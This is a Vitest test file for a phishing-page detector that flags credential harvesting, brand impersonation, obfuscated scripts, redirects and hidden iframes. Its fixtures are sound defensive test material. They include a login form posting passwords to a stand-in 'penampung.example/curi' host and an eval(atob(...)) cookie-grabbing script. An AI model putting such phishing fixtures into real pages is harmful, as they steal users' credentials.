import { describe, expect, it } from 'vitest'
import { analyzePageContent } from '../src/website/pageSignals.js'
import { analyzeForms } from '../src/website/behavior.js'
import { PAGE_SIGNAL_CODES } from '../src/website/types.js'

const PAGE = 'https://halaman-clone.example/masuk'

function inspect(html: string, overrides: Partial<Parameters<typeof analyzePageContent>[0]> = {}) {
  const baseUrl = overrides.baseUrl ?? PAGE
  return analyzePageContent({
    html,
    baseUrl,
    pageHost: new URL(baseUrl).hostname,
    pageSecure: new URL(baseUrl).protocol === 'https:',
    registrableDomain: 'halaman-clone.example',
    ...overrides,
  })
}

function codes(analysis: ReturnType<typeof inspect>): string[] {
  return analysis.findings.map((finding) => finding.code)
}

function findingOf(analysis: ReturnType<typeof inspect>, code: string) {
  return analysis.findings.find((finding) => finding.code === code)
}

describe('analyzePageContent — kredensial dan tujuan form', () => {
  it('membedakan halaman masuk biasa dari form yang mengirim sandi ke host lain', () => {
    const normal = inspect(
      '<form action="/login" method="post"><input name="email"><input type="password" name="password"></form>',
    )
    expect(codes(normal)).not.toContain('credential_request')

    const harvest = inspect(
      '<form action="https://penampung.example/curi" method="post"><input name="email"><input type="password" name="password"></form>',
    )
    const credential = findingOf(harvest, 'credential_request')
    expect(credential?.strength).toBe('moderate')
    expect(credential?.detail).toContain('penampung.example')
  })

  it('menandai permintaan OTP atau PIN sebagai sinyal yang butuh konteks', () => {
    const analysis = inspect('<form><input name="otp_code"><input name="pin"></form>')
    const credential = findingOf(analysis, 'credential_request')
    expect(credential).toBeDefined()
    expect(credential?.detail).toContain('layanan sah')
  })

  it('memakai analisis form yang tersedia tanpa menghitung ulang', () => {
    const html = '<form action="https://penampung.example/curi"><input type="password"></form>'
    const forms = analyzeForms({ html, baseUrl: PAGE, pageHost: 'halaman-clone.example', pageSecure: true })
    const analysis = inspect(html, { forms })
    expect(analysis.forms).toBe(forms)
    expect(analysis.forms.totals.externalActions).toBe(1)
  })
})

describe('analyzePageContent — identitas merek', () => {
  it('menandai halaman yang memakai nama merek di luar domain resminya', () => {
    const analysis = inspect('<img src="/img/paypal-logo.png" alt="PayPal"><h1>Masuk PayPal</h1>')
    const mismatch = findingOf(analysis, 'brand_identity_mismatch')
    expect(mismatch).toBeDefined()
    expect(mismatch?.strength).toBe('moderate')
    expect(mismatch?.detail).toContain('belum membuktikan peniruan')
  })

  it('tidak menandai halaman milik domain resmi merek', () => {
    const analysis = inspect('<h1>Selamat datang ke Tokopedia</h1>', {
      baseUrl: 'https://tokopedia.com/masuk',
      pageHost: 'tokopedia.com',
      registrableDomain: 'tokopedia.com',
    })
    expect(codes(analysis)).not.toContain('brand_identity_mismatch')
  })

  it('tidak menandai kata yang kebetulan memuat nama merek sebagai identitas', () => {
    const analysis = inspect('<img alt="nanas pineapple goreng"><p>harga promo spesial</p>')
    expect(codes(analysis)).not.toContain('brand_identity_mismatch')
  })

  it('menautkan merek hanya ketika tautan halaman memang menuju domain resmi merek itu', () => {
    const analysis = inspect(
      '<p>PayPal</p><a href="https://paypal.com/help">Bantuan</a><a href="/ketentuan">Ketentuan</a>',
    )
    expect(codes(analysis)).toContain('brand_anchor_target')
    expect(codes(inspect('<p>PayPal resmi (paypal.com) dijelaskan di sini</p>'))).not.toContain(
      'brand_anchor_target',
    )
  })
})

describe('analyzePageContent — skrip dan pengalihan', () => {
  it('membaca teks skrip tanpa pernah menjalankan skrip', () => {
    const analysis = inspect(
      '<script>eval(atob("Z2V0Q29va2llKCk="));var s=String.fromCharCode(0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f);</script>',
    )
    expect(codes(analysis)).toContain('script_obfuscation')
    expect(analysis.notes.join(' ')).toContain('Tidak ada JavaScript yang dijalankan')
  })

  it('menandai meta refresh yang berpindah ke domain lain', () => {
    const analysis = inspect('<meta http-equiv="refresh" content="0;url=https://tujuan-lain.example/x">')
    const refresh = findingOf(analysis, 'meta_refresh_redirect')
    expect(refresh?.strength).toBe('moderate')
    expect(refresh?.evidence).toContain('tujuan-lain.example')
  })

  it('menandai penulisan lokasi ke domain lain dengan catatan bahwa skrip tidak dijalankan', () => {
    const analysis = inspect('<script>window.location="https://tujuan-lain.example/phish";</script>')
    const redirect = findingOf(analysis, 'script_location_redirect')
    expect(redirect?.strength).toBe('moderate')
    expect(redirect?.detail).toContain('tidak menjalankan skrip')
  })

  it('menandai iframe tersembunyi', () => {
    const analysis = inspect('<iframe src="https://lain.example/f" style="display:none" width=1 height=1></iframe>')
    expect(codes(analysis)).toContain('hidden_frame')
  })

  it('menandai pembatasan interaksi browser hanya bila lebih dari satu pola', () => {
    expect(codes(inspect('<body oncontextmenu="return false">'))).not.toContain('interaction_lock')
    expect(
      codes(inspect('<body oncontextmenu="return false"><style>body{user-select:none}</style>')),
    ).toContain('interaction_lock')
  })

  it('memperkuat lencana keamanan palsu ketika halaman tidak terenkripsi', () => {
    const insecure = analyzePageContent({
      html: '<img src="/ssl-seal.png" alt="Secure Site">',
      baseUrl: 'http://halaman-clone.example/',
      pageHost: 'halaman-clone.example',
      pageSecure: false,
      registrableDomain: 'halaman-clone.example',
    })
    expect(findingOf(insecure, 'fake_secure_badge')?.strength).toBe('moderate')
    expect(codes(inspect('<img alt="Secure Site">'))).not.toContain('credential_request')
  })
})

describe('analyzePageContent — teks dan rasio tautan', () => {
  it('menandai bahasa mendesak', () => {
    const analysis = inspect('<p>Akun Anda diblokir. Segera verifikasi sekarang juga.</p>')
    expect(codes(analysis)).toContain('urgency_language')
  })

  it('menandai instruksi transfer ke rekening', () => {
    const analysis = inspect('<p>Silakan transfer ke rekening BCA 1234567890 sekarang.</p>')
    expect(findingOf(analysis, 'payment_diversion')?.strength).toBe('moderate')
  })

  it('tidak menandai halaman dengan banyak tautan internal', () => {
    const html = `<a href="/a"></a><a href="/b"></a><a href="/c"></a><a href="/d"></a><a href="/e"></a>`
    const analysis = inspect(html)
    expect(analysis.anchors.internal).toBe(5)
    expect(codes(analysis)).not.toContain('anchor_external_ratio')
  })

  it('menandai rasio tautan yang hampir seluruhnya keluar', () => {
    const analysis = inspect(
      [1, 2, 3, 4, 5].map((i) => `<a href="https://lain${i}.example/p${i}">t${i}</a>`).join('') + '<a href="/satu">s</a>',
    )
    expect(analysis.anchors.external).toBe(5)
    expect(codes(analysis)).toContain('anchor_external_ratio')
  })
})

describe('analyzePageContent — batas klaim', () => {
  it('melaporkan unavailable tanpa mengarang temuan ketika dokumen tidak ada', () => {
    const analysis = analyzePageContent({
      html: null,
      baseUrl: null,
      pageHost: 'halaman-clone.example',
      pageSecure: true,
      registrableDomain: 'halaman-clone.example',
    })
    expect(analysis.status).toBe('unavailable')
    expect(analysis.inspected).toBe(false)
    expect(analysis.findings).toEqual([])
    expect(analysis.notes.join(' ')).toContain('bukan bukti bahwa halaman aman')
  })

  it('tidak mengklaim pemeriksaan tampilan visual', () => {
    const analysis = inspect('<img src="/paypal-logo.png">')
    expect(analysis.notes.join(' ')).toContain('tidak menilai tampilan visual')
  })

  it('setiap temuan memakai kode yang terdaftar dan membawa bukti yang dipotong', () => {
    const analysis = inspect(
      '<img alt="PayPal"><form action="https://penampung.example/c"><input type="password" name="otp"></form>' +
        '<script>eval("x")</script><meta http-equiv="refresh" content="0;url=https://lain.example/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">',
    )
    expect(analysis.findings.length).toBeLessThanOrEqual(12)
    for (const finding of analysis.findings) {
      expect(PAGE_SIGNAL_CODES).toContain(finding.code)
      if (finding.evidence) expect(finding.evidence.length).toBeLessThanOrEqual(120)
    }
  })
})
